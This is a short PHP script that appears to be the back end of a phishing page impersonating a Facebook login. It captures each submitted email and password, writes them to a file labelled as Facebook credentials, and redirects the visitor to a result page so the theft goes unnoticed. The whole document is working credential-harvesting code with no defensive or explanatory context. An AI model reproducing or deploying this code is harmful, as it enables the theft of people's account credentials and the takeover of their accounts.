<?php

file_put_contents("usernames.txt", "Facebook :- username : " . $_POST['email'] . "  || Pass : " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();